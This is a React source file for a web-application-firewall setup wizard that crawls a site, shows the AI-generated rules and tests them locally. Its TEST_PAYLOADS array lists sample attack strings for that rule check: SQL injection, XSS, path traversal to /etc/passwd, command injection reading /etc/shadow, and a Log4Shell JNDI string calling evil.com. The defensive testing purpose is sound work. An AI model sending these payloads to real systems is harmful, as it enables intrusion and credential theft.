import { useState, useEffect, useCallback } from 'react';
import { CheckCircle, Loader2, Globe, Brain, Shield, FileSearch, Play, ChevronDown, ChevronUp, AlertTriangle, Zap, Eye, X } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { cn } from '@/lib/utils';
import { toast } from 'sonner';
import { supabase } from '@/integrations/supabase/client';

type Phase = 'progress' | 'report' | 'review' | 'test' | 'done';

interface SetupStep {
  id: string;
  label: string;
  icon: React.ReactNode;
  status: 'pending' | 'running' | 'done' | 'error';
}

interface CrawlReport {
  technologies: string[];
  api_endpoints: string[];
  script_sources: string[];
  link_hrefs: string[];
  form_actions: string[];
  meta_tags: Record<string, string>;
  html_snippet: string;
}

interface GeneratedConfig {
  app_type: string;
  waf_rules: any[];
  rate_limits: any[];
  api_endpoints: any[];
}

// Sample attack payloads for safe test mode
const TEST_PAYLOADS = [
  { name: "SQL Injection (Login Bypass)", payload: "admin' OR '1'='1' --", method: "POST", path: "/api/login" },
  { name: "XSS Script Tag", payload: "<script>alert(document.cookie)</script>", method: "GET", path: "/search?q=" },
  { name: "Path Traversal", payload: "../../../etc/passwd", method: "GET", path: "/files/" },
  { name: "Remote Code Execution", payload: "; cat /etc/shadow", method: "POST", path: "/api/exec" },
  { name: "SQL UNION Attack", payload: "' UNION SELECT username,password FROM users--", method: "GET", path: "/api/users?id=" },
  { name: "XSS Event Handler", payload: "<img onerror=alert(1) src=x>", method: "POST", path: "/api/comment" },
  { name: "Log4Shell", payload: "${jndi:ldap://evil.com/exploit}", method: "GET", path: "/api/search?q=" },
  { name: "Clean Request", payload: '{"username":"john","email":"john@example.com"}', method: "POST", path: "/api/register" },
];

interface Props {
  siteId: string;
  siteUrl: string;
  siteName: string;
  onComplete: () => void;
  onCancel: () => void;
}

export default function SetupWizard({ siteId, siteUrl, siteName, onComplete, onCancel }: Props) {
  const [phase, setPhase] = useState<Phase>('progress');
  const [steps, setSteps] = useState<SetupStep[]>([
    { id: 'crawl', label: 'Crawling site HTML & resources', icon: <Globe className="w-3.5 h-3.5" />, status: 'pending' },
    { id: 'detect', label: 'Detecting tech stack & endpoints', icon: <FileSearch className="w-3.5 h-3.5" />, status: 'pending' },
    { id: 'ai', label: 'AI analyzing & generating rules', icon: <Brain className="w-3.5 h-3.5" />, status: 'pending' },
    { id: 'ready', label: 'Configuration ready for review', icon: <Shield className="w-3.5 h-3.5" />, status: 'pending' },
  ]);
  const [crawlReport, setCrawlReport] = useState<CrawlReport | null>(null);
  const [config, setConfig] = useState<GeneratedConfig | null>(null);
  const [testResults, setTestResults] = useState<{ name: string; blocked: boolean; matchedRule: string | null }[]>([]);
  const [activating, setActivating] = useState(false);
  const [expandedSections, setExpandedSections] = useState<Record<string, boolean>>({ rules: true, rates: false, endpoints: false });

  const updateStep = useCallback((id: string, status: SetupStep['status']) => {
    setSteps(prev => prev.map(s => s.id === id ? { ...s, status } : s));
  }, []);

  // Run the preview crawl + AI analysis
  useEffect(() => {
    let cancelled = false;

    const run = async () => {
      // Step 1: Crawl
      updateStep('crawl', 'running');
      await delay(400);
      if (cancelled) return;

      // Step 2: Start detection (visual — happens server-side together)
      updateStep('crawl', 'done');
      updateStep('detect', 'running');
      await delay(300);
      if (cancelled) return;

      // Step 3: AI (fire the real request)
      updateStep('detect', 'done');
      updateStep('ai', 'running');

      try {
        const { data, error } = await supabase.functions.invoke('auto-setup-waf', {
          body: { site_url: siteUrl, site_name: siteName, site_id: siteId, mode: 'preview' },
        });
        if (cancelled) return;
        if (error || data?.error) throw new Error(data?.error || error?.message || 'AI analysis failed');

        updateStep('ai', 'done');
        updateStep('ready', 'done');

        setCrawlReport(data.crawl_report);
        setConfig(data.config);
        setPhase('report');
      } catch (err: any) {
        if (cancelled) return;
        updateStep('ai', 'error');
        toast.error(err.message || 'Setup failed');
      }
    };

    run();
    return () => { cancelled = true; };
  }, [siteUrl, siteName, siteId, updateStep]);

  // Run safe test mode against generated rules
  const runTestMode = () => {
    if (!config) return;
    const results = TEST_PAYLOADS.map(tp => {
      const checkString = `${tp.path}${tp.payload} ${tp.payload}`;
      let matched: string | null = null;
      for (const rule of config.waf_rules) {
        try {
          const regex = new RegExp(rule.pattern, 'i');
          if (regex.test(checkString)) {
            matched = rule.name;
            break;
          }
        } catch { /* invalid regex */ }
      }
      return { name: tp.name, blocked: !!matched, matchedRule: matched };
    });
    setTestResults(results);
    setPhase('test');
  };

  // Activate: write config to database
  const activateConfig = async () => {
    if (!config) return;
    setActivating(true);
    try {
      const { data, error } = await supabase.functions.invoke('auto-setup-waf', {
        body: { site_url: siteUrl, site_name: siteName, site_id: siteId, mode: 'activate', config },
      });
      if (error || data?.error) throw new Error(data?.error || error?.message);
      toast.success(`Activated ${data.rules_created} rules, ${data.rate_limits_created} rate limits, ${data.endpoints_monitored} endpoints`);
      setPhase('done');
      onComplete();
    } catch (err: any) {
      toast.error(err.message || 'Activation failed');
    }
    setActivating(false);
  };

  const toggleSection = (key: string) => setExpandedSections(prev => ({ ...prev, [key]: !prev[key] }));

  return (
    <div className="glass-card rounded-xl border border-primary/30 overflow-hidden">
      {/* Header */}
      <div className="px-5 py-4 border-b border-border/50 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-lg bg-primary/10 flex items-center justify-center">
            <Shield className="w-4.5 h-4.5 text-primary" />
          </div>
          <div>
            <p className="text-sm font-semibold text-foreground">WAF Setup — {siteName}</p>
            <p className="text-[10px] font-mono text-muted-foreground">{siteUrl}</p>
          </div>
        </div>
        {phase !== 'done' && (
          <Button size="icon" variant="ghost" className="w-7 h-7 text-muted-foreground" onClick={onCancel}>
            <X className="w-3.5 h-3.5" />
          </Button>
        )}
      </div>

      <div className="p-5">
        {/* ── PHASE 1: Progress Tracker ── */}
        {phase === 'progress' && (
          <div className="space-y-3">
            {steps.map((step, i) => (
              <div key={step.id} className="flex items-center gap-3">
                <div className={cn(
                  "w-7 h-7 rounded-lg flex items-center justify-center shrink-0 transition-colors",
                  step.status === 'done' && "bg-primary/15 text-primary",
                  step.status === 'running' && "bg-primary/10 text-primary",
                  step.status === 'pending' && "bg-secondary/40 text-muted-foreground/50",
                  step.status === 'error' && "bg-destructive/15 text-destructive",
                )}>
                  {step.status === 'running' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> :
                   step.status === 'done' ? <CheckCircle className="w-3.5 h-3.5" /> :
                   step.status === 'error' ? <AlertTriangle className="w-3.5 h-3.5" /> : step.icon}
                </div>
                <span className={cn(
                  "text-xs transition-colors",
                  step.status === 'done' && "text-foreground",
                  step.status === 'running' && "text-primary font-medium",
                  step.status === 'pending' && "text-muted-foreground/50",
                  step.status === 'error' && "text-destructive",
                )}>{step.label}</span>
                {step.status === 'running' && <span className="text-[10px] font-mono text-primary animate-pulse ml-auto">WORKING</span>}
              </div>
            ))}
          </div>
        )}

        {/* ── PHASE 2: Crawl Verification Report ── */}
        {phase === 'report' && crawlReport && (
          <div className="space-y-4">
            <div>
              <h4 className="text-xs font-semibold text-foreground mb-2 flex items-center gap-1.5">
                <FileSearch className="w-3.5 h-3.5 text-primary" /> Crawl Verification Report
              </h4>
              <p className="text-[10px] text-muted-foreground mb-3">Real data extracted from your site during the live HTTP crawl.</p>
            </div>

            {/* Technologies */}
            <ReportSection title="Detected Technologies" count={crawlReport.technologies.length}>
              <div className="flex flex-wrap gap-1.5">
                {crawlReport.technologies.map(t => (
                  <span key={t} className="px-2 py-0.5 rounded-md bg-primary/10 text-primary text-[10px] font-mono">{t}</span>
                ))}
                {crawlReport.technologies.length === 0 && <span className="text-[10px] text-muted-foreground">No frameworks detected (SSR/protected site)</span>}
              </div>
            </ReportSection>

            {/* API Endpoints */}
            <ReportSection title="Discovered API Endpoints" count={crawlReport.api_endpoints.length}>
              {crawlReport.api_endpoints.length > 0 ? (
                <div className="space-y-1 max-h-32 overflow-y-auto">
                  {crawlReport.api_endpoints.map((ep, i) => (
                    <p key={i} className="text-[10px] font-mono text-foreground/80">{ep}</p>
                  ))}
                </div>
              ) : <span className="text-[10px] text-muted-foreground">No API paths found in HTML source</span>}
            </ReportSection>

            {/* Script Sources */}
            <ReportSection title="External Scripts" count={crawlReport.script_sources.length}>
              <div className="space-y-1 max-h-28 overflow-y-auto">
                {crawlReport.script_sources.slice(0, 10).map((s, i) => (
                  <p key={i} className="text-[10px] font-mono text-foreground/70 truncate">{s}</p>
                ))}
              </div>
            </ReportSection>

            {/* Form Actions */}
            {crawlReport.form_actions.length > 0 && (
              <ReportSection title="Form Actions" count={crawlReport.form_actions.length}>
                <div className="space-y-1">
                  {crawlReport.form_actions.map((f, i) => (
                    <p key={i} className="text-[10px] font-mono text-foreground/80">{f}</p>
                  ))}
                </div>
              </ReportSection>
            )}

            {/* Meta Tags */}
            {Object.keys(crawlReport.meta_tags).length > 0 && (
              <ReportSection title="Meta Tags" count={Object.keys(crawlReport.meta_tags).length}>
                <div className="space-y-1 max-h-24 overflow-y-auto">
                  {Object.entries(crawlReport.meta_tags).slice(0, 8).map(([k, v]) => (
                    <p key={k} className="text-[10px] font-mono"><span className="text-muted-foreground">{k}:</span> <span className="text-foreground/80">{v}</span></p>
                  ))}
                </div>
              </ReportSection>
            )}

            <div className="flex gap-2 pt-2">
              <Button size="sm" onClick={() => setPhase('review')} className="bg-primary text-primary-foreground rounded-lg">
                <Eye className="w-3.5 h-3.5 mr-1.5" /> Review Generated Config
              </Button>
            </div>
          </div>
        )}

        {/* ── PHASE 3: Config Diff / Review ── */}
        {phase === 'review' && config && (
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <h4 className="text-xs font-semibold text-foreground">Generated Configuration</h4>
              <span className="text-[10px] font-mono text-primary">{config.app_type}</span>
            </div>

            {/* WAF Rules */}
            <DiffSection
              title={`WAF Rules (${config.waf_rules.length})`}
              expanded={expandedSections.rules}
              onToggle={() => toggleSection('rules')}
              icon={<Shield className="w-3 h-3 text-primary" />}
            >
              <div className="space-y-2">
                {config.waf_rules.map((r: any, i: number) => (
                  <div key={i} className="bg-secondary/20 rounded-lg p-3 space-y-1.5">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-medium text-foreground">{r.name}</span>
                      <div className="flex items-center gap-2">
                        <span className={cn("text-[9px] font-mono uppercase px-1.5 py-0.5 rounded",
                          r.severity === 'critical' ? 'bg-destructive/15 text-destructive' :
                          r.severity === 'high' ? 'bg-warning/15 text-warning' :
                          'bg-muted/30 text-muted-foreground'
                        )}>{r.severity}</span>
                        <span className="text-[9px] font-mono text-muted-foreground">{r.category}</span>
                      </div>
                    </div>
                    <p className="text-[10px] text-muted-foreground">{r.description}</p>
                    <code className="block text-[10px] font-mono text-accent bg-background/50 rounded px-2 py-1 break-all">{r.pattern}</code>
                  </div>
                ))}
              </div>
            </DiffSection>

            {/* Rate Limits */}
            <DiffSection
              title={`Rate Limits (${config.rate_limits.length})`}
              expanded={expandedSections.rates}
              onToggle={() => toggleSection('rates')}
              icon={<Zap className="w-3 h-3 text-warning" />}
            >
              <div className="space-y-2">
                {config.rate_limits.map((r: any, i: number) => (
                  <div key={i} className="bg-secondary/20 rounded-lg p-3 flex items-center justify-between">
                    <div>
                      <p className="text-xs font-medium text-foreground">{r.name}</p>
                      <p className="text-[10px] font-mono text-muted-foreground">{r.path}</p>
                    </div>
                    <div className="text-right">
                      <p className="text-xs font-mono text-foreground">{r.max_requests}<span className="text-muted-foreground">/{r.window_seconds}s</span></p>
                      <p className="text-[10px] font-mono text-muted-foreground uppercase">{r.action}</p>
                    </div>
                  </div>
                ))}
              </div>
            </DiffSection>

            {/* API Endpoints */}
            <DiffSection
              title={`API Endpoints (${config.api_endpoints.length})`}
              expanded={expandedSections.endpoints}
              onToggle={() => toggleSection('endpoints')}
              icon={<Globe className="w-3 h-3 text-accent" />}
            >
              <div className="overflow-x-auto">
                <table className="w-full text-[10px]">
                  <thead>
                    <tr className="border-b border-border/30">
                      <th className="text-left py-1.5 px-2 font-mono text-muted-foreground">METHOD</th>
                      <th className="text-left py-1.5 px-2 font-mono text-muted-foreground">PATH</th>
                      <th className="text-center py-1.5 px-2 font-mono text-muted-foreground">SCHEMA</th>
                      <th className="text-center py-1.5 px-2 font-mono text-muted-foreground">JWT</th>
                      <th className="text-center py-1.5 px-2 font-mono text-muted-foreground">RATE</th>
                    </tr>
                  </thead>
                  <tbody>
                    {config.api_endpoints.map((ep: any, i: number) => (
                      <tr key={i} className="border-b border-border/20">
                        <td className="py-1.5 px-2 font-mono text-foreground">{ep.method}</td>
                        <td className="py-1.5 px-2 font-mono text-foreground">{ep.path}</td>
                        <td className="py-1.5 px-2 text-center">{ep.schema_validation ? '✓' : '—'}</td>
                        <td className="py-1.5 px-2 text-center">{ep.jwt_inspection ? '✓' : '—'}</td>
                        <td className="py-1.5 px-2 text-center">{ep.rate_limited ? '✓' : '—'}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </DiffSection>

            <div className="flex gap-2 pt-2">
              <Button size="sm" variant="outline" onClick={() => setPhase('report')} className="rounded-lg text-xs">
                ← Crawl Report
              </Button>
              <Button size="sm" variant="outline" onClick={runTestMode} className="rounded-lg text-xs">
                <Play className="w-3 h-3 mr-1.5" /> Test Rules
              </Button>
              <Button size="sm" onClick={activateConfig} disabled={activating} className="bg-primary text-primary-foreground rounded-lg text-xs ml-auto">
                {activating ? <Loader2 className="w-3.5 h-3.5 mr-1.5 animate-spin" /> : <Shield className="w-3.5 h-3.5 mr-1.5" />}
                {activating ? 'Activating...' : 'Activate Protection'}
              </Button>
            </div>
          </div>
        )}

        {/* ── PHASE 4: Test Mode Results ── */}
        {phase === 'test' && (
          <div className="space-y-3">
            <div>
              <h4 className="text-xs font-semibold text-foreground flex items-center gap-1.5">
                <Play className="w-3.5 h-3.5 text-primary" /> Safe Test Mode — Rule Validation
              </h4>
              <p className="text-[10px] text-muted-foreground mt-1">
                Tested {TEST_PAYLOADS.length} sample attack payloads against your generated rules. No real traffic was affected.
              </p>
            </div>

            <div className="space-y-1.5">
              {testResults.map((r, i) => (
                <div key={i} className={cn(
                  "flex items-center justify-between px-3 py-2 rounded-lg text-xs",
                  r.blocked ? "bg-primary/5 border border-primary/20" :
                  r.name === 'Clean Request' ? "bg-accent/5 border border-accent/20" :
                  "bg-destructive/5 border border-destructive/20"
                )}>
                  <div className="flex items-center gap-2">
                    {r.blocked ? (
                      <Shield className="w-3.5 h-3.5 text-primary shrink-0" />
                    ) : r.name === 'Clean Request' ? (
                      <CheckCircle className="w-3.5 h-3.5 text-accent shrink-0" />
                    ) : (
                      <AlertTriangle className="w-3.5 h-3.5 text-destructive shrink-0" />
                    )}
                    <span className="text-foreground font-medium">{r.name}</span>
                  </div>
                  <div className="text-right">
                    {r.blocked ? (
                      <span className="text-[10px] font-mono text-primary">BLOCKED — {r.matchedRule}</span>
                    ) : r.name === 'Clean Request' ? (
                      <span className="text-[10px] font-mono text-accent">PASSED ✓</span>
                    ) : (
                      <span className="text-[10px] font-mono text-destructive">NOT CAUGHT — needs AI layer</span>
                    )}
                  </div>
                </div>
              ))}
            </div>

            <div className="bg-secondary/20 rounded-lg p-3">
              <p className="text-[10px] text-muted-foreground">
                <strong className="text-foreground">Note:</strong> Regex rules are Stage 4 of the pipeline. Payloads not caught here will still be evaluated by the AI Detection engine (Stage 5) in production, which catches novel and obfuscated attacks.
              </p>
            </div>

            <div className="flex gap-2 pt-1">
              <Button size="sm" variant="outline" onClick={() => setPhase('review')} className="rounded-lg text-xs">
                ← Back to Review
              </Button>
              <Button size="sm" onClick={activateConfig} disabled={activating} className="bg-primary text-primary-foreground rounded-lg text-xs ml-auto">
                {activating ? <Loader2 className="w-3.5 h-3.5 mr-1.5 animate-spin" /> : <Shield className="w-3.5 h-3.5 mr-1.5" />}
                {activating ? 'Activating...' : 'Activate Protection'}
              </Button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

// ── Helper Components ──

function ReportSection({ title, count, children }: { title: string; count: number; children: React.ReactNode }) {
  return (
    <div className="bg-secondary/15 rounded-lg p-3">
      <p className="text-[10px] font-mono text-muted-foreground mb-2">
        {title} <span className="text-primary ml-1">({count})</span>
      </p>
      {children}
    </div>
  );
}

function DiffSection({ title, expanded, onToggle, icon, children }: {
  title: string; expanded: boolean; onToggle: () => void; icon: React.ReactNode; children: React.ReactNode;
}) {
  return (
    <div className="border border-border/30 rounded-lg overflow-hidden">
      <button onClick={onToggle} className="w-full flex items-center justify-between px-4 py-2.5 bg-secondary/15 hover:bg-secondary/25 transition-colors">
        <div className="flex items-center gap-2">
          {icon}
          <span className="text-xs font-medium text-foreground">{title}</span>
        </div>
        {expanded ? <ChevronUp className="w-3.5 h-3.5 text-muted-foreground" /> : <ChevronDown className="w-3.5 h-3.5 text-muted-foreground" />}
      </button>
      {expanded && <div className="p-3 border-t border-border/30">{children}</div>}
    </div>
  );
}

function delay(ms: number) {
  return new Promise(r => setTimeout(r, ms));
}